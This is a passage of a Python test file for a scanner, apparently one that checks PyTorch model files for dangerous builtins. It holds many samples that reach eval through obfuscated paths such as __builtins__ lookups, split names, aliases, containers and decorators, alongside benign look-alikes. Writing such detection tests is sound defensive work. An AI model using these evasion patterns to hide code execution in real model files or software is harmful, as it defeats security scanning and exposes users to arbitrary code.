            "return __builtin__.eval(value)",
            "return __builtins__['eval'](value)",
            "return __builtin__.__dict__['eval'](value)",
            "return getattr(__builtins__, 'eval')(value)",
            "return __builtins__.get('eval')(value)",
            "return __builtins__.__getitem__('eval')(value)",
            "return __builtins__['ev' + 'al'](value)",
            "return globals()['__builtins__']['eval'](value)",
            "return globals().get('__builtins__').eval(value)",
            "return eval.__call__(value)",
            "sink = eval.__call__\n    return sink(value)",
            "return getattr(eval, '__call__')(value)",
            "return __builtins__.eval.__call__(value)",
            "return __builtins__.__getattribute__('eval')(value)",
            "module = __builtins__\n    return module.eval(value)",
            "module = __builtins__ if value else object()\n    return module.eval(value)",
            "import __builtin__ as module\n    return module.eval(value)",
            "namespace = __builtins__.__dict__\n    return namespace['eval'](value)",
            "namespace = vars(__builtins__)\n    return namespace.get('eval')(value)",
        ],
    )
    def test_scan_model_detects_dangerous_dunder_builtins_access(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    return callbacks[0](value)",
            "callbacks = {'run': eval}\n    return callbacks['run'](value)",
            "callbacks = {'run': eval}\n    return callbacks.get('run')(value)",
            "callbacks = [len, eval]\n    alias = callbacks\n    return alias[1](value)",
            "callbacks = [[eval]]\n    return callbacks[0][0](value)",
            "callbacks = [len, eval]\n    return callbacks[-1](value)",
            "callbacks = [len]\n    callbacks[-1] = eval\n    return callbacks[0](value)",
            "callbacks = [len]\n    callbacks[0] = eval\n    return callbacks[-1](value)",
            "callbacks = [len]\n    alias = callbacks\n    alias[0] = eval\n    return callbacks[0](value)",
            "callbacks = alias = [len]\n    alias[0] = eval\n    return callbacks[0](value)",
            "callbacks = [eval]\n    independent = [eval]\n    callbacks[0] = len\n    return independent[0](value)",
            "callbacks = [eval] if value else {0: len}\n    return callbacks[0](value)",
            "callbacks = [len] if value else {0: eval}\n    return callbacks[0](value)",
            "return object.__getattribute__(__builtins__, 'eval')(value)",
            "holder.sink = eval\n    return holder.sink(value)",
            "setattr(holder, 'sink', eval)\n    return holder.sink(value)",
            "object.__setattr__(holder, 'sink', eval)\n    return holder.sink(value)",
        ],
    )
    def test_scan_model_detects_dangerous_builtins_through_indirect_storage(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value, holder):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffclass H:\n    sink = eval\nH().sink('1+1')\n",
            b"\x00\xffclass H:\n    sink = eval\nholder = H()\nholder.sink('1+1')\n",
            (b"\x00\xffdef payload(holder):\n    holder.__dict__['sink'] = eval\n    return holder.sink('1+1')\n"),
            (b"\x00\xffdef payload(holder):\n    vars(holder)['sink'] = eval\n    return holder.sink('1+1')\n"),
            (b"\x00\xffdef framing():\n    return None\nglobals()['sink'] = eval\nsink('1+1')\n"),
            (b"\x00\xffsink = None\ndef configure():\n    global sink\n    sink = eval\nconfigure()\nsink('1+1')\n"),
            (
                b"\x00\xffdef outer():\n"
                b"    sink = None\n"
                b"    def configure():\n"
                b"        nonlocal sink\n"
                b"        sink = eval\n"
                b"    configure()\n"
                b"    return sink('1+1')\n"
                b"outer()\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    match {'run': eval}:\n"
                b"        case {'run': sink}:\n"
                b"            return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    callbacks = {'run': eval}\n"
                b"    match callbacks:\n"
                b"        case {'run': sink}:\n"
                b"            return sink('1+1')\n"
            ),
            (b"\x00\xffeval = lambda value: value\nfrom builtins import *\neval('1+1')\n"),
        ],
    )
    def test_scan_model_detects_dangerous_builtins_across_extended_alias_transfers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffclass H:\n    sink = eval\n    sink = len\nH().sink([])\n",
            (b"\x00\xffclass H:\n    sink = eval\nholder = H()\nholder.sink = len\nholder.sink([])\n"),
            (
                b"\x00\xffdef benign(holder):\n"
                b"    holder.__dict__['sink'] = eval\n"
                b"    holder.__dict__['sink'] = len\n"
                b"    return holder.sink([])\n"
            ),
            (
                b"\x00\xffdef benign(holder):\n"
                b"    vars = lambda value: value.storage\n"
                b"    vars(holder)['sink'] = eval\n"
                b"    return holder.sink([])\n"
            ),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"globals = lambda: {}\n"
                b"globals()['sink'] = eval\n"
                b"sink = len\n"
                b"sink([])\n"
            ),
            (b"\x00\xffsink = len\ndef configure():\n    global sink\n    sink = eval\nsink([])\n"),
            (b"\x00\xffsink = eval\ndef configure():\n    global sink\n    sink = len\nconfigure()\nsink([])\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    def configure():\n"
                b"        nonlocal sink\n"
                b"        sink = len\n"
                b"    configure()\n"
                b"    return sink([])\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    match {'safe': len, 'unused': eval}:\n"
                b"        case {'safe': sink}:\n"
                b"            return sink([])\n"
            ),
            b"\x00\xfffrom helpers import *\ndef benign(eval):\n    return eval('1+1')\n",
        ],
    )
    def test_scan_model_avoids_false_positives_across_extended_alias_transfers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffsink = None\n"
                b"def configure():\n"
                b"    global sink\n"
                b"    sink = eval\n"
                b"run = configure\n"
                b"run()\n"
                b"sink('1+1')\n"
            ),
            (b"\x00\xffdef get_callback():\n    return eval\nsink = get_callback()\nsink('1+1')\n"),
            b"\x00\xffdef get_callback():\n    return eval\nget_callback()('1+1')\n",
            (
                b"\x00\xffcallbacks = None\n"
                b"def configure():\n"
                b"    global callbacks\n"
                b"    callbacks = [eval]\n"
                b"configure()\n"
                b"callbacks[0]('1+1')\n"
            ),
            (
                b"\x00\xffmodule = None\n"
                b"def configure():\n"
                b"    global module\n"
                b"    module = __builtins__\n"
                b"configure()\n"
                b"module.eval('1+1')\n"
            ),
            b"\x00\xffdef payload():\n    runner = map\n    return list(runner(eval, ['1+1']))\n",
            (b"\x00\xffdef payload(values):\n    order = sorted\n    return order(values, key=eval)\n"),
            b"\x00\xffdef payload():\n    return eval.__getattribute__('__call__')('1+1')\n",
            b"\x00\xffdef payload():\n    return object.__getattribute__(eval, '__call__')('1+1')\n",
            b"\x00\xffdef run(callback):\n    return callback('1+1')\nrun(eval)\n",
            b"\x00\xffclass H:\n    callbacks = [eval]\nH.callbacks[0]('1+1')\n",
            b"\x00\xffclass H:\n    callbacks = [eval]\nH().callbacks[0]('1+1')\n",
            b"\x00\xfflocals()['sink'] = eval\nsink('1+1')\n",
            (b"\x00\xffdef framing():\n    return None\nlocals()['sink'] = eval\nsink('1+1')\n"),
            (b"\x00\xffdef payload(holder):\n    holder.callbacks = [eval]\n    return holder.callbacks[0]('1+1')\n"),
            (b"\x00\xfffrom builtins import getattr as lookup\nlookup(__builtins__, 'eval')('1+1')\n"),
            (b"\x00\xfffrom builtins import map as apply\nlist(apply(eval, ['1+1']))\n"),
            (b"\x00\xffclass H:\n    def __init__(self):\n        self.sink = eval\nH().sink('1+1')\n"),
            (b"\x00\xffclass H:\n    def __init__(self):\n        self.callbacks = [eval]\nH().callbacks[0]('1+1')\n"),
            (b"\x00\xffdef framing():\n    return None\neval = len\ndel eval\neval('1+1')\n"),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"try:\n"
                b"    raise ValueError\n"
                b"except Exception as eval:\n"
                b"    pass\n"
                b"eval('1+1')\n"
            ),
            b"\x00\xffdef run(callback):\n    return callback('1+1')\nrun(*[eval])\n",
            (b"\x00\xffdef run(callback=None):\n    return callback('1+1')\nrun(**{'callback': eval})\n"),
            (b"\x00\xffdef run(callback):\n    return callback('1+1')\nholder.run = run\nholder.run(eval)\n"),
            (b"\x00\xffclass H:\n    def run(self, callback):\n        return callback('1+1')\nH().run(eval)\n"),
            (b"\x00\xffdef payload():\n    run = lambda callback: callback('1+1')\n    return run(eval)\n"),
            (
                b"\x00\xffclass H:\n"
                b"    def __init__(self, callback):\n"
                b"        self.sink = callback\n"
                b"H(eval).sink('1+1')\n"
            ),
            b"\x00\xffclass B:\n    sink = eval\nclass H(B):\n    pass\nH().sink('1+1')\n",
            (b"\x00\xffdef payload():\n    first, *rest = [len, eval]\n    return rest[0]('1+1')\n"),
            (b"\x00\xffdef run(callback):\n    return callback('1+1')\ndef get():\n    return run\nget()(eval)\n"),
            (b"\x00\xffdef run(callback):\n    return callback('1+1')\ncallbacks = [run]\ncallbacks[0](eval)\n"),
            (b"\x00\xffdef run(getter):\n    return getter(__builtins__, 'eval')('1+1')\nrun(getattr)\n"),
            (b"\x00\xffdef framing():\n    return None\ncallbacks = []\ncallbacks.append(eval)\ncallbacks[0]('1+1')\n"),
            (b"\x00\xffdef framing():\n    return None\nglobals()['sink'] = eval\nglobals()['sink']('1+1')\n"),
            (b"\x00\xffclass H:\n    def run(self, callback):\n        return callback('1+1')\nH.run(H(), eval)\n"),
            (b"\x00\xffimport builtins\ngetattr(builtins, '__dict__')['eval']('1+1')\n"),
            (
                b"\x00\xffclass C:\n"
                b"    def __enter__(self):\n"
                b"        return eval\n"
                b"    def __exit__(self, *_args):\n"
                b"        pass\n"
                b"with C() as sink:\n"
                b"    sink('1+1')\n"
            ),
            (
                b"\x00\xffclass C:\n"
                b"    async def __aenter__(self):\n"
                b"        return eval\n"
                b"    async def __aexit__(self, *_args):\n"
                b"        pass\n"
                b"async def payload():\n"
                b"    async with C() as sink:\n"
                b"        sink('1+1')\n"
            ),
            (b"\x00\xffdef deco(function):\n    return eval\n@deco\ndef sink():\n    pass\nsink('1+1')\n"),
            (b"\x00\xffdef framing():\n    return None\ncallbacks = [eval]\ncallbacks.pop()('1+1')\n"),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"callbacks = [len, eval]\n"
                b"callbacks.pop(0)\n"
                b"callbacks[0]('1+1')\n"
            ),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback('1+1')\n"
                b"callbacks = [len, run]\n"
                b"callbacks.pop(0)\n"
                b"callbacks[0](eval)\n"
            ),
            (b"\x00\xffeval = len\ndef payload():\n    global eval\n    del eval\n    return eval('1+1')\npayload()\n"),
            (
                b"\x00\xffclass H:\n"
                b"    @classmethod\n"
                b"    def run(cls, callback):\n"
                b"        return callback('1+1')\n"
                b"H.run(eval)\n"
            ),
            (b"\x00\xffdef deco(_class):\n    return eval\n@deco\nclass C:\n    pass\nC('1+1')\n"),
            (b"\x00\xffclass H:\n    @property\n    def sink(self):\n        return eval\nH().sink('1+1')\n"),
            (
                b"\x00\xffclass H:\n"
                b"    def run(self, callback):\n"
                b"        return callback('1+1')\n"
                b"Alias = H\n"
                b"Alias().run(eval)\n"
            ),
            (b"__builtins__.__dict__.pop('eval')('1+1')\n"),
            b"\x00\xffcallbacks = []\ncallbacks += [eval]\ncallbacks[0]('1+1')\n",
            b"callbacks = []\nalias = callbacks\ncallbacks += [eval]\nalias[0]('1+1')\n",
            b"\x00\xffdef run(g=getattr):\n    g(__builtins__, 'eval')('1+1')\nrun()\n",
            (b"\x00\xffdef run(g=getattr):\n    return g(__builtins__, 'eval')('1+1')\nrun()\n"),
            (b"\x00\xffdef run(callback):\n    callback('1+1')\ndef outer(*funcs):\n    funcs[0](eval)\nouter(run)\n"),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback('1+1')\n"
                b"def outer(*functions):\n"
                b"    return functions[0](eval)\n"
                b"outer(run)\n"
            ),
            b"\x00\xff(lambda callback: callback('1+1'))(eval)\n",
            b"(lambda callback: callback('1+1'))(eval)\n",
            b"\x00\xffglobals().update({'sink': eval})\nsink('1+1')\n",
            b"\x00\xffglobals().update(sink=eval)\nsink('1+1')\n",
            b"\x00\xfffor _index, callback in enumerate([eval]):\n    callback('1+1')\n",
            (b"\x00\xffdef payload():\n    for _index, callback in enumerate([eval]):\n        callback('1+1')\n"),
            (
                b"\x00\xffasync def get_callback():\n"
                b"    return eval\n"
                b"async def main():\n"
                b"    (await get_callback())('1+1')\n"
            ),
            (
                b"\x00\xffasync def get_callback():\n"
                b"    return eval\n"
                b"async def payload():\n"
                b"    (await get_callback())('1+1')\n"
            ),
            b"\x00\xffnext(iter([eval]))('1+1')\n",
            (b"\x00\xffdef payload():\n    return next(iter([eval]))('1+1')\n"),
            (b"\x00\xffdef payload():\n    return next(iter([]), eval)('1+1')\n"),
            b"\x00\xffcallbacks = list([eval])\ncallbacks[0]('1+1')\n",
            (b"\x00\xffdef payload():\n    callbacks = list([eval])\n    return callbacks[0]('1+1')\n"),
            b"\x00\xffcallbacks = dict(sink=eval)\ncallbacks['sink']('1+1')\n",
            (b"\x00\xffdef payload():\n    callbacks = dict(run=eval)\n    return callbacks['run']('1+1')\n"),
            b"\x00\xffmatch [eval]:\n    case [sink] | (sink,):\n        sink('1+1')\n",
            (
                b"\x00\xffdef payload():\n"
                b"    match [eval]:\n"
                b"        case [callback] | (callback,):\n"
                b"            callback('1+1')\n"
            ),
            (b"\x00\xffdef run(callbacks=[]):\n    callbacks.append(eval)\n    return callbacks[0]('1+1')\nrun()\n"),
            (b"callbacks = {'run': eval}\nfor callback in callbacks.values():\n    callback('1+1')\n"),
            (b"callbacks = {**{'run': eval}}\ncallbacks['run']('1+1')\n"),
            (b"callbacks = [len, eval]\ncallbacks[1:][0]('1+1')\n"),
            (b"callbacks = [len] + [eval]\ncallbacks[1]('1+1')\n"),
            (b"callbacks = [] + [eval]\ncallbacks[0]('1+1')\n"),
            (b"def run(callback):\n    callback('1+1')\ncallbacks = [] + [run]\ncallbacks[0](eval)\n"),
            (b"class C:\n    def __call__(self, callback):\n        callback('1+1')\nC()(eval)\n"),
            (b"class C:\n    def __new__(cls):\n        return eval\nC()('1+1')\n"),
            (b"callbacks = {eval}\nfor callback in callbacks:\n    callback('1+1')\n"),
            (b"import builtins as b\nb.getattr(__builtins__, 'eval')('1+1')\n"),
            (b"import builtins as b\nb.vars(__builtins__)['eval']('1+1')\n"),
            (b"def configure():\n    globals()['sink'] = eval\nconfigure()\nsink('1+1')\n"),
            (b"import operator\noperator.call(eval, '1+1')\n"),
            (b"from operator import call as invoke\ninvoke(eval, '1+1')\n"),
            (b"name = f'eval'\ngetattr(__builtins__, name)('1+1')\n"),
            (b"callbacks = {'run': eval}\ncallbacks.setdefault('run')('1+1')\n"),
            (b"callbacks = {'run': eval}\ndict.get(callbacks, 'run')('1+1')\n"),
            (b"callbacks = [eval]\nlist.__getitem__(callbacks, 0)('1+1')\n"),
            (b"staticmethod(eval)('1+1')\n"),
            (b"def run():\n    list(map(lambda callback: callback('1+1'), [eval]))\nrun()\n"),
            (b"def callbacks():\n    yield eval\nfor callback in callbacks():\n    callback('1+1')\n"),
            (b"from functools import reduce\nreduce(lambda _value, callback: callback('1+1'), [eval], None)\n"),
            (b"try:\n    raise Exception(eval)\nexcept Exception as error:\n    error.args[0]('1+1')\n"),
            (b"type(eval).__call__(eval, '1+1')\n"),
            (b"def annotated(value: eval):\n    pass\nannotated.__annotations__['value']('1+1')\n"),
        ],
    )
    def test_scan_model_detects_dangerous_builtins_across_callable_summaries(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "source",
        [
            "callbacks = [callback for callback in [eval]]\ncallbacks[0]('1+1')\n",
            "callbacks = [callback for callback in [len, eval]]\ncallbacks[1]('1+1')\n",
            "for _index, callback in zip([0], [eval]):\n    callback('1+1')\n",
            (
                "class Base:\n"
                "    def run(self, callback):\n"
                "        return callback('1+1')\n"
                "class Child(Base):\n"
                "    def execute(self):\n"
                "        return super().run(eval)\n"
                "Child().execute()\n"
            ),
            (
                "class Dangerous:\n"
                "    def run(self, callback):\n"
                "        return callback('1+1')\n"
                "class Safe:\n"
                "    def run(self, callback):\n"
                "        return len([])\n"
                "class Child(Dangerous, Safe):\n"
                "    def execute(self):\n"
                "        return super().run(eval)\n"
                "Child().execute()\n"
            ),
            "import operator\noperator.methodcaller('__call__', '1+1')(eval)\n",
            ("import operator\ninvoke = operator.methodcaller\ninvoke('__call__', '1+1')(eval)\n"),
            "from operator import attrgetter\nattrgetter('__call__')(eval)('1+1')\n",
            "callbacks = []\ncallbacks.insert(0, eval)\ncallbacks[0]('1+1')\n",
            "callbacks = [len]\nalias = callbacks\nalias.insert(1, eval)\ncallbacks[1]('1+1')\n",
            "callbacks = {}\ncallbacks.update({'run': eval})\ncallbacks['run']('1+1')\n",
            "callbacks = {'run': len}\nalias = callbacks\nalias.update(run=eval)\ncallbacks['run']('1+1')\n",
            "callbacks = {'run': eval}\nfor _name, callback in callbacks.items():\n    callback('1+1')\n",
            "import operator\noperator.getitem([eval], 0)('1+1')\n",
            "from operator import getitem\ngetitem([eval], 0)('1+1')\n",
            "callbacks = [len]\ncallbacks.__setitem__(0, eval)\ncallbacks[0]('1+1')\n",
            "callbacks = {'run': len}\ndict.__setitem__(callbacks, 'run', eval)\ncallbacks['run']('1+1')\n",
            "callbacks = [eval, len]\ncallbacks.reverse()\ncallbacks[1]('1+1')\n",
            "iter([eval]).__next__()('1+1')\n",
            "[eval][::-1][0]('1+1')\n",
            "([eval] * 2)[1]('1+1')\n",
            "([eval] * 100)[99]('1+1')\n",
            "next(iter({'run': eval}.values()))('1+1')\n",
            "((callback := eval), callback)[1]('1+1')\n",
        ],
    )
    def test_dangerous_builtin_alias_regressions(self, source: str) -> None:
        tree = ast.parse(source)

        findings = JITScriptDetector._dangerous_builtin_calls_in_tree(tree)

        assert "eval" in findings

    @pytest.mark.parametrize(
        "source",
        [
            "callbacks = [callback for callback in [len]]\ncallbacks[0]([])\nunused = eval\n",
            "callbacks = [callback for callback in [len, eval]]\ncallbacks[0]([])\n",
            ("zip = lambda *_args: [(0, len)]\nfor _index, callback in zip([0], [eval]):\n    callback([])\n"),
            (
                "class Base:\n"
                "    def run(self, callback):\n"
                "        return callback('1+1')\n"
                "class Helper:\n"
                "    def run(self, callback):\n"
                "        return len([])\n"
                "class Child(Base):\n"
                "    def execute(self):\n"
                "        super = lambda: Helper()\n"
                "        return super().run(eval)\n"
                "Child().execute()\n"
            ),
            (
                "class Dangerous:\n"
                "    def run(self, callback):\n"
                "        return callback('1+1')\n"
                "class Safe:\n"
                "    def run(self, callback):\n"
                "        return len([])\n"
                "class Child(Safe, Dangerous):\n"
                "    def execute(self):\n"
                "        return super().run(eval)\n"
                "Child().execute()\n"
            ),
            (
                "import operator\n"
                "operator = type('Safe', (), {'methodcaller': lambda *_args: lambda callback: len})\n"
                "operator.methodcaller('__call__', '1+1')(eval)\n"
            ),
            "import operator\noperator.attrgetter('__name__')(eval)\n",
            (
                "import operator\n"
                "invoke = operator.methodcaller\n"
                "invoke = lambda *_args: lambda callback: len\n"
                "invoke('__call__', '1+1')(eval)\n"
            ),
            "callbacks = []\ncallbacks.insert(0, len)\ncallbacks[0]([])\nunused = eval\n",
            "callbacks = [eval]\ncallbacks.insert(0, len)\ncallbacks[0]([])\n",
            "callbacks = {}\ncallbacks.update({'run': len})\ncallbacks['run']([])\nunused = eval\n",
            "callbacks = {'run': eval}\ncallbacks.update(run=len)\ncallbacks['run']([])\n",
            "callbacks = {'run': len}\nfor _name, callback in callbacks.items():\n    callback([])\nunused = eval\n",
            "import operator\noperator.getitem([len], 0)([])\nunused = eval\n",
            (
                "import operator\n"
                "operator = type('Safe', (), {'getitem': lambda _items, _index: len})\n"
                "operator.getitem([eval], 0)([])\n"
            ),
            "callbacks = [eval]\ncallbacks.__setitem__(0, len)\ncallbacks[0]([])\n",
            "callbacks = {'run': eval}\ndict.__setitem__(callbacks, 'run', len)\ncallbacks['run']([])\n",
            "callbacks = [eval, len]\ncallbacks.reverse()\ncallbacks[0]([])\n",
            "callbacks = [eval]\ncallbacks.clear()\ncallbacks.append(len)\ncallbacks[0]([])\n",
            "iter([len]).__next__()([])\nunused = eval\n",
            "[len][::-1][0]([])\nunused = eval\n",
            "([len] * 2)[1]([])\nunused = eval\n",
            "([len] * 100)[99]([])\nunused = eval\n",
            "next(iter({'run': len}.values()))([])\nunused = eval\n",
            "((callback := len), callback)[1]([])\nunused = eval\n",
        ],
    )
    def test_dangerous_builtin_alias_regressions_avoid_false_positives(self, source: str) -> None:
        tree = ast.parse(source)

        findings = JITScriptDetector._dangerous_builtin_calls_in_tree(tree)

        assert "eval" not in findings

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffsink = len\n"
                b"def configure():\n"
                b"    global sink\n"
                b"    sink = eval\n"
                b"run = configure\n"
                b"run = lambda: None\n"
                b"run()\n"
                b"sink([])\n"
            ),
            b"\x00\xffdef get_callback():\n    return eval\nget_callback()\n",
            b"\x00\xffdef get_callback():\n    return len\nget_callback()([])\n",
            (
                b"\x00\xffcallbacks = [eval]\n"
                b"def configure():\n"
                b"    global callbacks\n"
                b"    callbacks = [len]\n"
                b"configure()\n"
                b"callbacks[0]([])\n"
            ),
            (b"\x00\xffdef benign():\n    runner = map\n    runner = len\n    return runner([])\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    map = lambda callback, values: values\n"
                b"    runner = map\n"
                b"    return runner(eval, ['1+1'])\n"
            ),
            b"\x00\xffdef benign(eval):\n    return eval.__getattribute__('__call__')('1+1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    object = type('Safe', (), {'__getattribute__': lambda *_args: len})\n"
                b"    return object.__getattribute__(eval, '__call__')([])\n"
            ),
            b"\x00\xffdef run(callback):\n    return callback([])\nrun(len)\nunused = eval\n",
            b"\x00\xffclass H:\n    callbacks = [eval]\n    callbacks = [len]\nH.callbacks[0]([])\n",
            b"\x00\xfflocals = lambda: {}\nlocals()['sink'] = eval\nsink = len\nsink([])\n",
            (b"\x00\xffdef framing():\n    return None\nlocals()['sink'] = eval\nlocals()['sink'] = len\nsink([])\n"),
            (
                b"\x00\xffdef benign(holder):\n"
                b"    holder.callbacks = [eval]\n"
                b"    holder.callbacks = [len]\n"
                b"    return holder.callbacks[0]([])\n"
            ),
            b"\x00\xffdef run(callback):\n    eval = len\n    eval([])\nrun(open)\n",
            (
                b"\x00\xfffrom builtins import getattr as lookup\n"
                b"lookup = lambda *_args: len\n"
                b"lookup(__builtins__, 'eval')([])\n"
            ),
            (
                b"\x00\xfffrom builtins import map as apply\n"
                b"apply = lambda callback, values: values\n"
                b"list(apply(eval, ['1+1']))\n"
            ),
            (
                b"\x00\xffclass H:\n"
                b"    def __init__(self):\n"
                b"        self.sink = eval\n"
                b"        self.sink = len\n"
                b"H().sink([])\n"
            ),
            (b"\x00\xffdef benign():\n    eval = len\n    del eval\n    return eval('1+1')\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    try:\n"
                b"        raise ValueError\n"
                b"    except Exception as eval:\n"
                b"        pass\n"
                b"    return eval('1+1')\n"
            ),
            b"\x00\xffdef run(callback):\n    return callback([])\nrun(*[len])\nunused = eval\n",
            (b"\x00\xffdef run(callback=None):\n    return callback([])\nrun(**{'callback': len})\nunused = eval\n"),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback([])\n"
                b"holder.run = run\n"
                b"holder.run(len)\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffclass H:\n"
                b"    def run(self, callback):\n"
                b"        return callback([])\n"
                b"H().run(len)\n"
                b"unused = eval\n"
            ),
            (b"\x00\xffdef benign():\n    run = lambda callback: callback([])\n    return run(len)\nunused = eval\n"),
            (
                b"\x00\xffclass H:\n"
                b"    def __init__(self, callback):\n"
                b"        self.sink = callback\n"
                b"H(len).sink([])\n"
                b"unused = eval\n"
            ),
            (b"\x00\xffclass B:\n    sink = eval\nclass H(B):\n    sink = len\nH().sink([])\n"),
            (b"\x00\xffdef benign():\n    first, *rest = [eval, len]\n    return rest[0]([])\n"),
            b"\x00\xffdef get():\n    return len\nget()([])\nunused = eval\n",
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback([])\n"
                b"callbacks = [run]\n"
                b"callbacks[0](len)\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback('1+1')\n"
                b"callbacks = [run]\n"
                b"callbacks[0] = len\n"
                b"callbacks[0]([])\n"
                b"unused = eval\n"
            ),
            (b"\x00\xffdef run(getter):\n    return getter(__builtins__, 'eval')([])\nrun(lambda *_args: len)\n"),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"callbacks = []\n"
                b"callbacks.append(len)\n"
                b"callbacks[0]([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"globals()['sink'] = eval\n"
                b"globals()['sink'] = len\n"
                b"globals()['sink']([])\n"
            ),
            (
                b"\x00\xffclass H:\n"
                b"    def run(self, callback):\n"
                b"        return callback([])\n"
                b"H.run(H(), len)\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffimport builtins\n"
                b"getattr = lambda *_args: {'eval': len}\n"
                b"getattr(builtins, '__dict__')['eval']([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffclass C:\n"
                b"    def __enter__(self):\n"
                b"        return len\n"
                b"    def __exit__(self, *_args):\n"
                b"        pass\n"
                b"with C() as sink:\n"
                b"    sink([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffclass C:\n"
                b"    async def __aenter__(self):\n"
                b"        return len\n"
                b"    async def __aexit__(self, *_args):\n"
                b"        pass\n"
                b"async def payload():\n"
                b"    async with C() as sink:\n"
                b"        sink([])\n"
                b"unused = eval\n"
            ),
            (b"\x00\xffdef deco(function):\n    return len\n@deco\ndef sink():\n    pass\nsink([])\nunused = eval\n"),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"callbacks = [eval]\n"
                b"callbacks.pop()\n"
                b"callbacks.append(len)\n"
                b"callbacks[0]([])\n"
            ),
            (b"\x00\xffdef framing():\n    return None\ncallbacks = [eval, len]\ncallbacks.pop(0)\ncallbacks[0]([])\n"),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback('1+1')\n"
                b"callbacks = [run, len]\n"
                b"callbacks.pop(0)\n"
                b"callbacks[0]([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffeval = len\n"
                b"def benign():\n"
                b"    global eval\n"
                b"    del eval\n"
                b"    eval = len\n"
                b"    return eval([])\n"
                b"benign()\n"
            ),
            (
                b"\x00\xffclass H:\n"
                b"    @classmethod\n"
                b"    def run(cls, callback):\n"
                b"        return callback([])\n"
                b"H.run(len)\n"
                b"unused = eval\n"
            ),
            (b"\x00\xffdef deco(_class):\n    return len\n@deco\nclass C:\n    pass\nC([])\nunused = eval\n"),
            (
                b"\x00\xffclass H:\n"
                b"    @property\n"
                b"    def sink(self):\n"
                b"        return len\n"
                b"H().sink([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffclass H:\n"
                b"    def run(self, callback):\n"
                b"        return callback([])\n"
                b"Alias = H\n"
                b"Alias().run(len)\n"
                b"unused = eval\n"
            ),
            (b"__builtins__.__dict__.pop('len')([])\nunused = eval\n"),
            b"\x00\xffcallbacks = []\ncallbacks += [len]\ncallbacks[0]([])\nunused = eval\n",
            b"callbacks = []\ncallbacks += [len]\ncallbacks[0]([])\nunused = eval\n",
            b"callbacks = (len,)\nalias = callbacks\ncallbacks += (eval,)\nalias[1]('1+1')\n",
            b"\x00\xffdef run(g=getattr):\n    g(__builtins__, 'len')([])\nrun()\nunused = eval\n",
            b"\x00\xffdef run(g=lambda *_args: len):\n    return g(__builtins__, 'eval')([])\nrun()\nunused = eval\n",
            (
                b"\x00\xffdef run(callback):\n"
                b"    callback([])\n"
                b"def outer(*funcs):\n"
                b"    funcs[0](len)\n"
                b"outer(run)\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffdef run(callback):\n"
                b"    return callback([])\n"
                b"def outer(*functions):\n"
                b"    return functions[0](len)\n"
                b"outer(run)\n"
                b"unused = eval\n"
            ),
            b"\x00\xff(lambda callback: callback([]))(len)\nunused = eval\n",
            b"(lambda callback: callback([]))(len)\nunused = eval\n",
            b"\x00\xffglobals().update({'sink': len})\nsink([])\nunused = eval\n",
            b"\x00\xffglobals().update(sink=len)\nsink([])\nunused = eval\n",
            b"\x00\xffglobals().update({'sink': eval})\nglobals().update({'sink': len})\nsink([])\n",
            b"\x00\xfffor _index, callback in enumerate([len]):\n    callback([])\nunused = eval\n",
            (
                b"\x00\xffdef payload():\n"
                b"    for _index, callback in enumerate([len]):\n"
                b"        callback([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffasync def get_callback():\n"
                b"    return len\n"
                b"async def main():\n"
                b"    (await get_callback())([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffasync def get_callback():\n"
                b"    return len\n"
                b"async def payload():\n"
                b"    (await get_callback())([])\n"
                b"unused = eval\n"
            ),
